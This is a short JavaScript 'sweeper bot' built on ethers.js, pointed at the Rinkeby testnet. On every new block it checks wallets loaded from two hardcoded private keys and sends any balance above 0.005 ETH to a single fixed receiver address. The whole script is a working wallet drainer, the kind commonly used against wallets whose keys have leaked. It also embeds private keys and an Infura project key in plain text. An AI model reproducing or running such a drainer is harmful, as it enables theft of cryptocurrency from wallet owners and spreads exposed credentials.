const {ethers} = require("ethers");
const provider = new ethers.providers.JsonRpcProvider("https://rinkeby.infura.io/v3/9f9fe9ee4878460488ae3b3784eb3ba0");
const addressReceiver = "0x728Ea8db5f7376Bd8FdcEc7847bDca931426A5aa"
const privateKeys = ["6ea03f819fa8c2c5683c9d79334e86971dd54b0b511216a32c5fdb62d860e8ef","3412025858c33cb7c7c9e6301e2d0f334be3fe07404818cbcc69c524c5aeeb94"]
const bot = async () => {
  provider.on("block", async () => {
    console.log("Listening new block, waiting..)");
    for (let i = 0; i < privateKeys.length; i++) {
      const _target = new ethers.Wallet(privateKeys[i]);
      const target = _target.connect(provider);
      const balance = await provider.getBalance(target.address);
      const txBuffer = ethers.utils.parseEther(".005");
      if (balance.sub(txBuffer) > 0) {
        console.log("NEW ACCOUNT WITH ETH!");
        const amount = balance.sub(txBuffer);
        try {
          await target.sendTransaction({
            to: addressReceiver,
            value: amount
          });
          console.log(`Success! transfered --> ${ethers.utils.formatEther(balance)}`);
        }
        catch (e) {
            console.log(`error: ${e}`);
        }
      }
    }
  });
}

bot();